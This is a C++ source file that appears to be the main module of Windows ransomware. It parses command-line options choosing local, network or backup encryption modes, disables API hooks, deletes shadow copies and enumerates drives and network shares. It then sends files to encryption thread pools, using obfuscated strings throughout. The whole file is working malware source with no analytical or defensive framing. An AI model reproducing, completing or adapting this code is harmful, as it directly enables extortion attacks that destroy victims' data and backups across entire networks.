#include "common.h"
#include "filesystem.h"
#include "network_scanner.h"
#include "threadpool.h"
#include <Shlwapi.h>
#include "global_parameters.h"
#include "locker.h"
#include "api.h"
#include "logs.h"
#include "process_killer.h"

typedef struct string_ {

	WCHAR wszString[16384];
	TAILQ_ENTRY(string_) Entries;

} STRING, * PSTRING;

typedef TAILQ_HEAD(string_list_, string_) STRING_LIST, * PSTRING_LIST;

STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC STRING_LIST g_HostList;
STATIC STRING_LIST g_PathList;
STATIC process_killer::PID_LIST g_WhitelistPids;

STATIC int my_stoi(char* str) {
	unsigned int strLen = 0;
	unsigned int i = 0;
	while (str[i] != '\0') {
		strLen += 1;
		i++;
	}

	int num = 0;
	int ten;
	BOOL signFlag = TRUE; //true: +, false: -
	for (i = 0; i < strLen; i++) {
		if (str[i] < '0' || str[i] > '9') {
			if (i == 0 && str[i] == '-') {
				signFlag = FALSE;
				continue;
			}
			if (i == 0 && str[i] == '+') {
				signFlag = TRUE;
				continue;
			}

			return 0;
		}

		ten = 1;
		for (unsigned int j = 0; j < strLen - 1 - i; j++) {
			ten *= 10;
		}

		num += ten * (str[i] - '0');
	}

	if (signFlag) {
		return num;
	}
	else {
		return -num;
	}
}


/*
STATIC
BOOL
ParsePidList(
	__in LPCWSTR String,
	__out process_killer::PPID_LIST PidList
)
{
	INT NeedLength = WideCharToMultiByte(CP_UTF8, 0, String, lstrlenW(String), NULL, 0, NULL, NULL);
	if (!NeedLength) {
		return FALSE;
	}

	LPSTR Utf8String = (LPSTR)m_malloc(NeedLength + 1);
	if (!Utf8String) {
		return FALSE;
	}

	WideCharToMultiByte(CP_UTF8, 0, String, lstrlenW(String), Utf8String, NeedLength + 1, NULL, NULL);


	LPSTR Pointer = NULL;
	LPSTR TempBuffer = Utf8String;
	CHAR PidString[17];

	do {

		Pointer = (LPSTR)pStrStrIA(TempBuffer, OBFA(","));
		if (!Pointer) {

			INT Length = plstrlenA(TempBuffer);
			if (Length) {
				
				RtlSecureZeroMemory(PidString, sizeof(PidString));
				memory::Copy(PidString, TempBuffer, Length);
				
				process_killer::PPID Pid = (process_killer::PPID)m_malloc(sizeof(process_killer::PID));
				if (!Pid) {
					break;
				}

				Pid->dwProcessId = my_stoi(PidString);
				TAILQ_INSERT_TAIL(PidList, Pid, Entries);

			}

			break;
		}

		SIZE_T Size = SIZE_T(Pointer - TempBuffer);
		if (!Size || Size > 16) {

			TempBuffer = (Pointer + 1);
			continue;

		}

		RtlSecureZeroMemory(PidString, sizeof(PidString));
		memory::Copy(PidString, TempBuffer, Size);

		process_killer::PPID Pid = (process_killer::PPID)m_malloc(sizeof(process_killer::PID));
		if (!Pid) {
			break;
		}

		Pid->dwProcessId = my_stoi(PidString);
		TAILQ_INSERT_TAIL(PidList, Pid, Entries);

		TempBuffer = (Pointer + 1);

	} while (Pointer);

	m_free(Utf8String);
	return TRUE;
}
*/

STATIC
BOOL
ParseFile(
	__in LPCWSTR FilePath,
	__out PSTRING_LIST List
)
{
	HANDLE hFile = pCreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	LPSTR FileBuffer = NULL;
	LARGE_INTEGER FileSize;
	if (!pGetFileSizeEx(hFile, &FileSize)) {

		pCloseHandle(hFile);
		return FALSE;

	}

	if (!FileSize.QuadPart) {

		pCloseHandle(hFile);
		return FALSE;

	}

	FileBuffer = (LPSTR)m_malloc(FileSize.QuadPart);
	if (!FileBuffer) {

		pCloseHandle(hFile);
		return FALSE;

	}


	DWORD dwRead = 0;
	BOOL Success = pReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwRead, NULL);
	if (!Success || dwRead != FileSize.QuadPart) {

		pCloseHandle(hFile);
		return FALSE;

	}

	LPSTR Pointer = NULL;
	LPSTR TempBuffer = FileBuffer;
	SIZE_T Size = 0;
	do {


		Pointer = (LPSTR)pStrStrIA(TempBuffer, OBFA("\n"));
		if (!Pointer) {
			break;
		}


		Size = SIZE_T(Pointer - TempBuffer);
		if (!Size || Size > 16384) {

			TempBuffer = (Pointer + 1);
			continue;

		}


		LPSTR Line = (LPSTR)m_malloc(Size + 1);
		if (!Line) {
			break;
		}


		memory::Copy(Line, TempBuffer, Size);
		if (Line[Size - 1] == '\r') {
			Line[Size - 1] = 0;
		}
		
		PSTRING String = (PSTRING)m_malloc(sizeof(STRING));
		if (!String) {

			m_free(Line);
			break;

		}

		pMultiByteToWideChar(CP_OEMCP, 0, Line, Size, String->wszString, 16384);
		TAILQ_INSERT_TAIL(List, String, Entries);

		m_free(Line);
		TempBuffer = (Pointer + 1);

	} while (Pointer);

	m_free(FileBuffer);
	pCloseHandle(hFile);
	return TRUE;
}

STATIC
LPWSTR
GetCommandLineArg(
	__in LPWSTR* Argv,
	__in INT Argc,
	__in LPCWSTR ArgName
)
{
	if (Argc <= 1) {
		return NULL;
	}

	for (INT i = 1; i < Argc; i++) {
		if (!plstrcmpiW(Argv[i], ArgName)) {

			if ((i + 1) < Argc) {
				return Argv[i + 1];
			}

		}
	}

	return NULL;
}

STATIC
BOOL
HandleCommandLine(PWSTR CmdLine)
{
	INT Argc = 0;
	LPWSTR* Argv = (LPWSTR*)pCommandLineToArgvW(CmdLine, &Argc);
	if (!Argv) {
		return FALSE;
	}

	LPWSTR HostsPath = GetCommandLineArg(Argv, Argc, OBFW(L"-h"));
	LPWSTR PathList = GetCommandLineArg(Argv, Argc, OBFW(L"-p"));
	LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L"-m"));
	LPWSTR LogsEnabled = GetCommandLineArg(Argv, Argc, OBFW(L"-log"));
	//LPWSTR ProcKiller = GetCommandLineArg(Argv, Argc, OBFW(L"-prockiller"));
	//LPWSTR PidList = GetCommandLineArg(Argv, Argc, OBFW(L"-pids"));

	if (EncryptMode) {

		if (!plstrcmpiW(EncryptMode, OBFW(L"all"))) {

			g_EncryptMode = ALL_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);

		}
		else if (!plstrcmpiW(EncryptMode, OBFW(L"local"))) {

			g_EncryptMode = LOCAL_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);

		}
		else if (!plstrcmpiW(EncryptMode, OBFW(L"net"))) {

			g_EncryptMode = NETWORK_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);

		} 
		else if (!plstrcmpiW(EncryptMode, OBFW(L"backups"))) {

			g_EncryptMode = BACKUPS_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);

		}

	}

	if (HostsPath) {
		ParseFile(HostsPath, &g_HostList);
	}

	if (PathList) {
		ParseFile(PathList, &g_PathList);
	}

	/*
	if (PidList) {
		ParsePidList(PidList, &g_WhitelistPids);
	}
	*/

	if (LogsEnabled) {

		if (!plstrcmpiW(LogsEnabled, OBFW(L"enabled"))) {
			logs::Init();
		}

	}


	/*
	if (ProcKiller) {
		if (!plstrcmpiW(ProcKiller, OBFW(L"enabled"))) {
			global::SetProcKiller(TRUE);
		}
		else {
			global::SetProcKiller(FALSE);
		}
	}
	*/

	return TRUE;
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	api::InitializeApiModule();
	api::DisableHooks();
 
	HANDLE hLocalSearch = NULL;
	filesystem::DRIVE_LIST DriveList;
	network_scanner::SHARE_LIST ShareList;

	TAILQ_INIT(&g_WhitelistPids);
	TAILQ_INIT(&DriveList);
	TAILQ_INIT(&ShareList);
	TAILQ_INIT(&g_PathList);
	TAILQ_INIT(&g_HostList);

	HANDLE hMutex = pCreateMutexA(NULL, TRUE, OBFA("kjsidugidf99439"));
	if ((DWORD)pWaitForSingleObject(hMutex, 0) != WAIT_OBJECT_0) {
		return EXIT_FAILURE;
	}


#ifndef DEBUG
	LPWSTR CmdLine = (LPWSTR)pGetCommandLineW();
	HandleCommandLine((PWSTR)CmdLine);
#else
	LPWSTR CmdLine = (LPWSTR)L"C:\\1.exe -prockiller enabled -pids 322";
	HandleCommandLine((PWSTR)CmdLine);
#endif

	SYSTEM_INFO SysInfo;
	pGetNativeSystemInfo(&SysInfo);

	DWORD dwLocalThreads = g_EncryptMode == LOCAL_ENCRYPT ? SysInfo.dwNumberOfProcessors * 2 : SysInfo.dwNumberOfProcessors;
	DWORD dwNetworkThreads = g_EncryptMode == NETWORK_ENCRYPT ? SysInfo.dwNumberOfProcessors * 2 : SysInfo.dwNumberOfProcessors;

	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, dwLocalThreads)) {

			logs::Write(OBFW(L"Can't create local threadpool."));
			return EXIT_FAILURE;

		}

		if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {

			logs::Write(OBFW(L"Can't start local threadpool."));
			return EXIT_FAILURE;

		}

	}

	if (g_EncryptMode == NETWORK_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, dwNetworkThreads)) {

			logs::Write(OBFW(L"Can't create network threadpool."));
			return EXIT_FAILURE;

		}

		if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {

			logs::Write(OBFW(L"Can't start network threadpool."));
			return EXIT_FAILURE;

		}

	}

	locker::DeleteShadowCopies();
	process_killer::GetWhiteListProcess(&g_WhitelistPids);
	locker::SetWhiteListProcess(&g_WhitelistPids);

	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		PSTRING Path = NULL;
		TAILQ_FOREACH(Path, &g_PathList, Entries) {
			filesystem::SearchFiles(Path->wszString, threadpool::LOCAL_THREADPOOL);
		}
	}
	else {
		PSTRING Path = NULL;
		TAILQ_FOREACH(Path, &g_PathList, Entries) {
			filesystem::SearchFiles(Path->wszString, threadpool::NETWORK_THREADPOOL);
		}
	}
	
	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		if (filesystem::EnumirateDrives(&DriveList)) {
			hLocalSearch = pCreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
		}

	}

	if (g_EncryptMode == NETWORK_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		PSTRING String = NULL;
		TAILQ_FOREACH(String, &g_HostList, Entries) {
			network_scanner::EnumShares(String->wszString, &ShareList);
		}

		network_scanner::PSHARE_INFO ShareInfo = NULL;
		TAILQ_FOREACH(ShareInfo, &ShareList, Entries) {
			filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
		}

		network_scanner::StartScan();

	}

	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {

		if (hLocalSearch) {
			pWaitForSingleObject(hLocalSearch, INFINITE);
		}
		threadpool::Wait(threadpool::LOCAL_THREADPOOL);

	}

	if (g_EncryptMode == NETWORK_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {
		threadpool::Wait(threadpool::NETWORK_THREADPOOL);
	}

	return EXIT_SUCCESS;
}